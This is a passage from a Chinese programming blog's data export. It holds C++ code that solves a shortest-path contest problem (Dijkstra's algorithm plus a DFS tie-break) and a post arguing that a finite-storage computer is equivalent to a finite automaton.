class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cassert&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INF 0x3f3f3f3f</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> index;</span><br><span class=\"line\">    <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; adj;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Node v[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> length[<span class=\"number\">600</span>][<span class=\"number\">600</span>]; <span class=\"comment\">// length[i][j]记录从node i到node j的length</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> TIME[<span class=\"number\">600</span>][<span class=\"number\">600</span>]; <span class=\"comment\">// TIME[i][j]记录从node i到node j的用时</span></span><br><span class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; tp[<span class=\"number\">600</span>];<span class=\"comment\">// node's parent list</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> tpResult[<span class=\"number\">600</span>];<span class=\"comment\">// 最终的node的parent</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> BEGIN, END; <span class=\"comment\">// 题目输入的天梯队员的起点和要到达的终点</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> vertexCnt, edgeCnt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dijstra</span><span class=\"params\">(<span class=\"keyword\">int</span> weight[][<span class=\"number\">600</span>])</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DFS</span><span class=\"params\">(<span class=\"keyword\">bool</span> isLength)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">outp</span><span class=\"params\">(<span class=\"keyword\">int</span> f, <span class=\"keyword\">int</span> index)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n, m;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;m)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">                TIME[i][j] = INF;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">                length[i][j] = INF;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            v[i].index = i;</span><br><span class=\"line\">            v[i].adj.clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            tp[i].clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        vertexCnt = n, edgeCnt = m;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> v1, v2, one, l, t;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d%d%d\"</span>, &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t);</span><br><span class=\"line\">            v[v1].adj.push_back(v2);</span><br><span class=\"line\">            <span class=\"comment\">// 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可</span></span><br><span class=\"line\">            length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l;</span><br><span class=\"line\">            TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!one) &#123;</span><br><span class=\"line\">                v[v2].adj.push_back(v1);</span><br><span class=\"line\">                length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l;</span><br><span class=\"line\">                TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;BEGIN, &amp;END);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (BEGIN == END) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"; Distance = \"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class=\"string\">\" =&gt; \"</span> &lt;&lt; END &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; TIME[BEGIN][END] &lt;&lt; <span class=\"string\">\"; Distance = \"</span> &lt;&lt; length[BEGIN][END] &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class=\"string\">\" =&gt; \"</span> &lt;&lt; END &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span> timeEND = dijstra(TIME);</span><br><span class=\"line\"><span class=\"comment\">//        outp(END, 0);</span></span><br><span class=\"line\">        DFS(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; r1, r2;</span><br><span class=\"line\">        r1.push_back(END);</span><br><span class=\"line\">        <span class=\"comment\">// 以下这种构造路径的方式是建立在起点不同于终点的情况下</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> tmp_tp = tpResult[END];</span><br><span class=\"line\">        r1.push_back(tmp_tp);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class=\"line\">            tmp_tp = tpResult[tmp_tp];</span><br><span class=\"line\">            r1.push_back(tmp_tp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        reverse(r1.begin(), r1.end());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            tp[i].clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> lenEND = dijstra(length);</span><br><span class=\"line\"><span class=\"comment\">//        outp(END, 0);</span></span><br><span class=\"line\">        DFS(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        r2.push_back(END);</span><br><span class=\"line\">        tmp_tp = tpResult[END];</span><br><span class=\"line\">        r2.push_back(tmp_tp);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class=\"line\">            tmp_tp = tpResult[tmp_tp];</span><br><span class=\"line\">            r2.push_back(tmp_tp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        reverse(r2.begin(), r2.end());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">bool</span> isSame = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (r1.size() == r2.size()) &#123;</span><br><span class=\"line\">            isSame = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size(); i++) &#123;</span><br><span class=\"line\">                isSame = (r1[i] == r2[i]) &amp;&amp; isSame;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isSame) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; timeEND &lt;&lt; <span class=\"string\">\"; Distance = \"</span> &lt;&lt; lenEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r1[r1.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; timeEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r1[r1.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Distance = \"</span> &lt;&lt; lenEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r2.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r2[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r2[r2.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Edge_t</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> me;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> t;</span><br><span class=\"line\">    Edge_t(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> h, <span class=\"keyword\">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Edge_t &amp;x) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> x.t &lt; <span class=\"keyword\">this</span>-&gt;t; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// bfs+优先队列其实就是dijstra算法</span></span><br><span class=\"line\"><span class=\"comment\">// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到</span></span><br><span class=\"line\"><span class=\"comment\">// 所以result set只会有node被加进去而不会有node被踢出去</span></span><br><span class=\"line\"><span class=\"comment\">// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dijstra</span><span class=\"params\">(<span class=\"keyword\">int</span> weight[][<span class=\"number\">600</span>])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> resWei[<span class=\"number\">600</span>];</span><br><span class=\"line\">    priority_queue&lt;Edge_t&gt; que;</span><br><span class=\"line\">    que.push(Edge_t(BEGIN, <span class=\"number\">0</span>, <span class=\"number\">0</span>));<span class=\"comment\">// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> visit[vertexCnt];  <span class=\"comment\">// 记录某点是否已经加入到dijstra的result set里</span></span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(visit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(visit) * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">bool</span>));</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!que.empty()) &#123;</span><br><span class=\"line\">        Edge_t t = que.top();</span><br><span class=\"line\">        que.pop();</span><br><span class=\"line\">        <span class=\"comment\">// 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (visit[t.me]) &#123;</span><br><span class=\"line\">            assert(resWei[t.me] &lt;= t.t);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (resWei[t.me] == t.t) &#123;</span><br><span class=\"line\">                tp[t.me].push_back(t.p);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        visit[t.me] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        tp[t.me].push_back(t.p);</span><br><span class=\"line\">        resWei[t.me] = t.t;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;adj = v[t.me].adj;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> al = adj.size();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; al; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adj[i] == t.me)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resWei[END];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> dp[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> dpVisit[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> f, <span class=\"keyword\">bool</span> isLength);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DFS</span><span class=\"params\">(<span class=\"keyword\">bool</span> isLength)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dp, <span class=\"number\">0xff</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(tpResult, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(tpResult));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dpVisit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(dpVisit));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __dfs(END, isLength);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> f, <span class=\"keyword\">bool</span> isLength) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dp[f] &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dp[f];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (f == BEGIN) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;t = tp[f];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> result = INF;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(t[i]==f)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dpVisit[t[i]])  <span class=\"comment\">// 代表该节点在这条路径上已经被访问过</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        dpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> p = __dfs(t[i], isLength) + (isLength ? <span class=\"number\">1</span> : length[t[i]][f]);</span><br><span class=\"line\">        dpVisit[f] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p &lt; result) &#123;</span><br><span class=\"line\">            tpResult[f] = t[i];</span><br><span class=\"line\">            result = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    dp[f] = result;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> path[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> outpVisit[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">outp</span><span class=\"params\">(<span class=\"keyword\">int</span> f, <span class=\"keyword\">int</span> index)</span> </span>&#123;</span><br><span class=\"line\">    outpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (f == BEGIN) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"outp: \"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; index; i++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; path[i] &lt;&lt; <span class=\"string\">\" \"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        outpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    path[index] = f;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;t = tp[f];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (outpVisit[t[i]])<span class=\"comment\">// means that 前辈们已经访问过了，再访问就成环了</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        outp(t[i], index + <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outpVisit[f] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","slug":"天梯L3-007-天梯地图","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"Dijstra最短路","slug":"Dijstra最短路","permalink":"https://h-zex.github.io/tags/Dijstra最短路/"},{"name":"天梯赛","slug":"天梯赛","permalink":"https://h-zex.github.io/tags/天梯赛/"}]},{"title":"有限存储的计算机等价于有限自动机（DFA、NFA）","date":"2018-05-11T08:13:18.000Z","path":"2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/","text":"$B=\\{0^n1^n|n\\ge0\\}$ Michael Sipser 的 Introduction to the Theory of Computation 的1.4提到一个非正则语言的例子，$B=\\{0^n1^n|n\\ge0\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别 但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢 事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值 如果是n处于一定范围内，容易构造出一台DFA识别B： 设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量 那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集 转移方程为 首先： $&lt;0,0&gt;\\rightarrow&lt;1,0&gt;\\rightarrow&lt;2,0&gt;\\rightarrow…\\rightarrow&lt;1000,0&gt;$ 然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$ 然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值 最后：一旦转移到 $&lt;n, n&gt;$ 就accept 为什么现实中的计算机有可能是DFA 计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能 对任意一段代码构造等价的NFANFA构造方法描述 假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个） 输入字符表是$\\{0,1\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。 假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态 假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state 该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ 为什么该NFA只接受允许的字符串，而不会接受多余的字符串 首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串 设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA 则最终的NFA只接受允许的字符串 是否会出现情况：代码两次处于某状态但是行为不一样 答案是肯定不会 计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的 对任意一台计算机构造等价的DFA 对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算 先说明一些前置情况： 现实中计算机使用源码处理特定的输入 把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M 因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA 然后开始构造DFA 该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个 DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态 第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态 从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合 计算机可以死循环，DFA不会死循环，为什么 consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。 因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。 在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环 截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变 而按照Introduction to the Theory of Computation 的1.2节的EQUIVALENCE OF NFAS AND DFASDFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）： $E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了","raw":"---\ntitle: 有限存储的计算机等价于有限自动机（DFA、NFA）\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-11 16:13:18\ntags:\n- DFA\n- NFA\n- 有限自动机\n- 